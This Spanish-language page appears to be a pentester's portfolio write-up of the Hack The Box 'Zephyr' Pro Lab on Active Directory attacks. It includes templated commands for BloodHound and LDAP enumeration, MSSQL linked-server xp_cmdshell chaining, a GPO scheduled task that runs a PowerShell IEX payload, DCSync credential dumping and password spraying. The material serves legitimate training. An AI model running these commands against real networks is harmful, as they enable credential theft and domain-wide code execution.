---
title: "Zephyr Certified Operator"
date: 2025-03-20
level: "Intermediate - Hard"
platform: "Hack The Box"
category: "Pro Lab"
duration: "Simulated Campaign"
image: "/images/about/Zephyr.jpg"
tags: ["Active Directory", "Reporting", "Pivoting", "GPO Abuse", "MSSQL"]
---

<div align="center">

![Author](https://img.shields.io/badge/Author-Flippermen-purple?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge)
![ProLab](https://img.shields.io/badge/Pro_Lab-Zephyr-cyan?style=for-the-badge)
![Level](https://img.shields.io/badge/Level-Intermediate_Hard-orange?style=for-the-badge)
![Team](https://img.shields.io/badge/Team-CyberFlippers-blue?style=for-the-badge)

**Flippermen | CyberFlippers | UDLA-Cyber**

</div>

---

| Campo | Valor |
|-------|-------|
| Pro Lab | Zephyr |
| Plataforma | Hack The Box |
| Dificultad | Intermediate - Hard |
| Entorno | Red corporativa Windows AD a gran escala |
| Enfoque | Enumeracion AD profunda, GPO Abuse, MSSQL, Reporting |

## Sobre Zephyr

**Zephyr** es un Pro Lab de Hack The Box disenado para cerrar la brecha entre el pentesting basico de Active Directory y las operaciones avanzadas en entornos enterprise. Simula una red corporativa realista con multiples subredes, controladores de dominio, servidores de bases de datos y estaciones de trabajo, creando un ecosistema que refleja la complejidad de una organizacion mediana-grande real.

Lo que distingue a Zephyr de otros labs es su doble enfasis: por un lado, la **enumeracion profunda y sistematica** de Active Directory para descubrir rutas de ataque no obvias; por otro, la importancia de la **documentacion y reporte comercial** del impacto de cada hallazgo — una competencia critica para pentesting profesional que rara vez se practica en entornos de laboratorio.

El lab expone vectores que van desde la enumeracion LDAP y el analisis de grafos de BloodHound hasta el abuso de Group Policy Objects (GPO) para despliegue de codigo malicioso, pasando por la explotacion de servidores MSSQL enlazados como ruta de escalada lateral.

**Vectores cubiertos:**
- **Active Directory Enumeration at Scale** — BloodHound, LDAP queries avanzadas, enumeracion de ACLs y delegaciones
- **GPO Weaponization** — Modificacion de politicas de grupo para despliegue masivo de payloads
- **MSSQL Linked Server Abuse** — Escalada de privilegios a traves de cadenas de servidores SQL enlazados
- **Credential Attacks** — Password spraying de bajo volumen, DCSync, credential harvesting
- **Professional Reporting** — Documentacion de hallazgos con impacto de negocio cuantificable

---

## 🔒 Confidential Assessment Profile

**Target Environment**: `Large Scale Active Directory`
**Focus**: `Enumeration & Reporting`

---

## ⚔️ Tactical Competencies

### 1. Deep AD Enumeration
*   **BloodHound Mastery**: Mapeo y analisis de rutas de ataque complejas en grafos de AD. Identificacion de shortest paths a Domain Admin, analisis de Kerberoastable accounts, y deteccion de delegaciones peligrosas.
*   **Stealthy Queries**: Extraccion de informacion LDAP sin alertar monitoreo basico — consultas dirigidas en lugar de enumeracion masiva, uso de filtros LDAP optimizados.
*   **ACL Analysis**: Identificacion de Access Control Entries (ACE) permisivas que otorgan control sobre objetos criticos (WriteDACL, GenericAll, ForceChangePassword).
*   **Trust Mapping**: Enumeracion de relaciones de confianza entre dominios y analisis de su impacto en la postura de seguridad.

### 2. Infrastructure Compromise
*   **GPO Weaponization**: Modificacion de Politicas de Grupo para despliegue de codigo malicioso a escala — scheduled tasks via GPO, logon scripts y software deployment.
*   **MSSQL Chains**: Escalada a traves de enlaces de servidores de bases de datos confiables (Linked Servers), permitiendo ejecucion de comandos en hosts remotos via `xp_cmdshell` encadenado.
*   **Service Account Abuse**: Explotacion de cuentas de servicio con SPNs (Service Principal Names) para Kerberoasting y posterior cracking offline.
*   **Shares & Data Mining**: Enumeracion de shares SMB accesibles para descubrir credenciales, scripts con passwords hardcodeados y documentacion sensible.

### 3. Credentials & Pivoting
*   **DCSync Operations**: Simulacion de un Domain Controller para volcar hashes NTLM de cualquier cuenta del dominio, incluyendo krbtgt.
*   **Password Spraying**: Ataques de fuerza bruta de bajo volumen contra multiples cuentas simultaneamente, respetando politicas de bloqueo de cuentas para evitar deteccion.
*   **Pass-the-Hash / Pass-the-Ticket**: Reutilizacion de credenciales obtenidas (hashes NTLM, tickets Kerberos) para movimiento lateral sin necesidad de contrasena en texto claro.
*   **Credential Chaining**: Encadenamiento de credenciales parciales obtenidas en diferentes fases para construir rutas de escalada completas.

### 4. Reporting & Business Impact
*   **Finding Documentation**: Documentacion estructurada de cada vulnerabilidad con evidencia de explotacion, impacto tecnico y riesgo de negocio.
*   **Attack Path Visualization**: Representacion visual de rutas de ataque completas (BloodHound exports, diagramas de red) para comunicacion con stakeholders no tecnicos.
*   **Risk Quantification**: Traduccion de hallazgos tecnicos a impacto de negocio medible — datos expuestos, sistemas criticos comprometidos, potencial de movimiento lateral.

## Metodologia Aplicada

### 1. Enumeracion Profunda de AD

```bash
# Recoleccion de datos para BloodHound
bloodhound-python -u <user> -p '<pass>' -d <domain> -c All -ns <DC_IP> --zip

# Enumeracion LDAP dirigida
ldapsearch -x -H ldap://<DC_IP> -D '<user>@<domain>' -w '<pass>' \
    -b "DC=<domain>,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Enumeracion de GPOs
Get-GPO -All | Select DisplayName, Id, GpoStatus
Get-GPPermission -All -TargetType User -TargetName <user>

# Shares accesibles
crackmapexec smb <SUBNET> -u <user> -p '<pass>' --shares
```

### 2. Abuso de MSSQL Linked Servers

```sql
-- Enumerar linked servers
SELECT name FROM sys.servers WHERE is_linked = 1;

-- Verificar permisos de ejecucion en servidor enlazado
EXEC ('SELECT SYSTEM_USER') AT [LINKED_SERVER]

-- Ejecucion remota encadenada
EXEC ('EXEC (''SELECT SYSTEM_USER'') AT [SECOND_LINKED_SERVER]') AT [FIRST_LINKED_SERVER]

-- Habilitar xp_cmdshell en servidor remoto
EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [LINKED_SERVER]
EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [LINKED_SERVER]
EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER]
```

### 3. GPO Abuse para Despliegue Masivo

```powershell
# Crear scheduled task via GPO (con permisos de edicion de GPO)
# SharpGPOAbuse - agregar tarea programada inmediata
SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" \
    --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" \
    --Arguments "/c powershell -ep bypass -c IEX(...)" \
    --GPOName "Default Domain Policy"

# Forzar actualizacion de politicas
gpupdate /force
```

### 4. DCSync y Extraccion de Credenciales

```bash
# DCSync completo con Impacket
secretsdump.py <domain>/<admin>:'<pass>'@<DC_IP> -just-dc

# DCSync selectivo (solo cuentas criticas)
secretsdump.py <domain>/<admin>:'<pass>'@<DC_IP> -just-dc-user krbtgt
secretsdump.py <domain>/<admin>:'<pass>'@<DC_IP> -just-dc-user administrator

# Password spraying controlado
crackmapexec smb <DC_IP> -u users.txt -p '<common_pass>' --no-bruteforce
```

## Herramientas Utilizadas

| Herramienta | Proposito |
|-------------|-----------|
| `BloodHound / SharpHound` | Mapeo de rutas de ataque y analisis de grafos AD |
| `ldapsearch / ldapdomaindump` | Enumeracion LDAP directa |
| `CrackMapExec / NetExec` | Password spraying, enumeracion SMB, ejecucion remota |
| `Impacket (secretsdump, mssqlclient)` | DCSync, interaccion con MSSQL |
| `SharpGPOAbuse` | Abuso de Group Policy Objects |
| `PowerView` | Enumeracion avanzada de AD desde PowerShell |
| `Rubeus` | Kerberoasting y manipulacion de tickets |
| `hashcat` | Cracking offline de hashes y tickets |
| `Evil-WinRM` | Acceso remoto a hosts Windows |

## Key Takeaways

1. **La enumeracion es la fase mas critica** — En entornos AD grandes, las vulnerabilidades raramente son obvias. El 80% del tiempo se invierte en enumeracion y el 20% en explotacion.
2. **BloodHound cambia las reglas del juego** — La visualizacion de rutas de ataque en grafos revela caminos que el analisis manual jamas descubriria en tiempo razonable.
3. **MSSQL Linked Servers son un vector subestimado** — Las cadenas de servidores SQL enlazados pueden atravesar segmentos de red y dominios, proporcionando ejecucion de codigo remoto sin herramientas ofensivas tradicionales.
4. **GPO Abuse tiene impacto masivo** — Un solo GPO comprometido puede desplegar codigo malicioso en todos los hosts del dominio simultaneamente.
5. **El reporte define al profesional** — Encontrar vulnerabilidades sin comunicar su impacto de negocio reduce el valor del hallazgo. El reporte comercial es una competencia tecnica, no un tramite administrativo.

---

## 🏆 Operational Impact

La certificacion de Zephyr valida una **metodologia solida de pentesting AD enterprise**, capaz de identificar debilidades estructurales en directorios activos masivos y comunicar su riesgo de negocio efectivamente. El lab entrena la competencia completa del auditor: desde la enumeracion metodica hasta la redaccion de reportes que mueven a la accion, pasando por la explotacion de vectores especificos de infraestructura (MSSQL, GPO) que son particularmente prevalentes en redes corporativas reales.

---

<div align="center">

**Flippermen**
*HackTheBox — Platinum Tier | #1 Ecuador | CyberFlippers | UDLA-Cyber*

</div>
